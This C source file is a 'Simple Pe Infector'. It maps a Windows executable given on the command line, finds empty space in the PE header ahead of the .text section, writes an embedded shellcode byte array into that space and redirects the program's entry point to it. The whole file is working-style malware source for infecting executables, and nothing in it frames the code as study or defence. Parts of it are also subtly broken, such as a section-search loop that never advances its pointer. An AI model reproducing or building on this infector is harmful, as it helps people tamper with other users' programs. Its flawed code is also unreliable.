/* Simple Pe Infector By _antony (c) http://sav1or.name*/
/* infecting method:
find a free space in pe header;
how it works?
we find PointerToRawData of .text section because system loader put's her first
then we use my simple formulation :
delta = PointerToRawData - sizeof(code) and scan this space of memmory if it's free infect file and
change OEP to delta.
may be it will be more correct to use
delta = PointerToRawData - (sizeof(code) + some more)

*/
/* iamge presentation
------------------
| PE HEADER |
|________________|
| |
| |
| OBJECT TABLE |
|________________|
| |
| |
| FREE SPACE |
| our code |
|________________|
| |
|.text section |
| next section |
| next section |
| .............. |
| |
------------------
*/

#include <windows.h>
#include <stdio.h>
#include <string.h>

static int getTextSectionOffset(PIMAGE_SECTION_HEADER pSectionHeader , int NumberOfSections)
{
    int n = NumberOfSections;
    while(n > 0)
    {
        if( !strcmp((char*)pSectionHeader->Name , ".text") || !strcmp((char*)pSectionHeader->Name , ".code") || !strcmp((char*)pSectionHeader->Name , "CODE") || !strcmp((char*)pSectionHeader->Name , "TEXT"))
        {
            return pSectionHeader->PointerToRawData;
        }
        n--;
    }
    /* we did not find .text section */
    return 0;
}

/* entry point */
int main(int argc , char *argv[])
{
    HANDLE hFile;
    HANDLE hMap;
    char *MappedFile = 0;
    DWORD FileSize; /* file size */
    DWORD delta;
    DWORD SectionOffset; /* .text section offset*/
    DWORD func_addr;
    IMAGE_DOS_HEADER *pDosHeader;
    IMAGE_NT_HEADERS *pNtHeader;
    IMAGE_SECTION_HEADER *pSecHeader;
    /* shell code*/
    //char code[] = "\x6A\x00" /*push 0 */
    //              "\xB8\x00\x00\x00\x00" /*mov eax , func_addr (address will be inserted automaticly)*/
    //              "\xFF\xD0"; /*call eax */
    char code[] =
        "\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64"
        "\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e"
        "\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60"
        "\x8b\x6c\x24\x24";


    if(argc < 2)
    {
        printf("parameters : ssv.exe [filename]\r\n");
        printf("simple pe infector by _antony\r\n");
        return 0;
    }
    printf("target: [%s] \n" , argv[1]);
    /* open file */
    hFile = CreateFile(argv[1] ,
                       GENERIC_WRITE | GENERIC_READ ,
                       0 ,
                       0 ,
                       OPEN_EXISTING ,
                       FILE_ATTRIBUTE_NORMAL ,
                       0);
    if(hFile == INVALID_HANDLE_VALUE)
    {
        printf("[Error]: Can't open File! Error code : %lu" , GetLastError());
        return -1;
    }
    /* get file size */
    FileSize = GetFileSize(hFile , 0 );
    printf("[File Size ]: %lu \n", FileSize);
    /* mapping file */
    hMap = CreateFileMapping(hFile ,
                             0 ,
                             PAGE_READWRITE,
                             0 ,
                             FileSize ,
                             0);
    if(hMap == INVALID_HANDLE_VALUE)
    {
        printf("[Error]: Can't map file! Error code: %lu\n" , GetLastError());
        CloseHandle(hFile);
        return -1;
    }
    printf("file mapped\n");
    MappedFile = (char*)MapViewOfFile(hMap , FILE_MAP_READ | FILE_MAP_WRITE , 0 , 0 , FileSize);
    if(MappedFile == NULL)
    {
        printf("[Error]: Can't map file! Error code %lu\n", GetLastError());
        CloseHandle(hFile);
        CloseHandle(hMap);
        UnmapViewOfFile(MappedFile);
        return -1;
    }
    pDosHeader = (IMAGE_DOS_HEADER*)MappedFile;
    pNtHeader = (IMAGE_NT_HEADERS*)((DWORD)MappedFile + pDosHeader->e_lfanew);
    pSecHeader = IMAGE_FIRST_SECTION(pNtHeader);
    /* get .text section PointerToRawData*/
    SectionOffset = getTextSectionOffset(pSecHeader , pNtHeader->FileHeader.NumberOfSections);
    if(SectionOffset == 0)
    {
        printf("[Error]: Can't find .text section!\n");
        CloseHandle(hFile);
        CloseHandle(hMap);
        UnmapViewOfFile(MappedFile);
        return -1;
    }
    delta = SectionOffset - sizeof(code);
    int i;
    BYTE check;
    printf("scanning...\n");
    /* scanning space if there are only 00 then we infect file */
    for(i=0 ; i<sizeof(code) ; i++)
    {
        check = *((BYTE*)MappedFile + delta + i);
        printf("%X \t", check);
        if(check != 0)
        {
            printf("There is some data...\n");
            CloseHandle(hFile);
            CloseHandle(hMap);
            UnmapViewOfFile(MappedFile);
            return -1;
        }
    }
    printf("Space if free , infecting File...\n");
    /* insert function address in shell code */
    func_addr = (DWORD)GetProcAddress( LoadLibrary("kernel32.dll") , "ExitProcess");
    for(i=0 ; i < sizeof(code) ; i++ )
    {
        if( *(DWORD*)&code[i] == 0x00000B8)
        {
            *(DWORD*)(code+i+1)= func_addr;
        }
    }
    printf("Old Entry Point : %08X \n" , (unsigned int) pNtHeader->OptionalHeader.AddressOfEntryPoint);
    memcpy(MappedFile+delta , code , sizeof(code));
    /* new entry point */
    pNtHeader->OptionalHeader.AddressOfEntryPoint = delta;
    printf("File infected!\n");
    printf("New Entry Point: %08X \n" , (unsigned int) delta);
    CloseHandle(hFile);
    CloseHandle(hMap);
    UnmapViewOfFile(MappedFile);
    return 0;
}
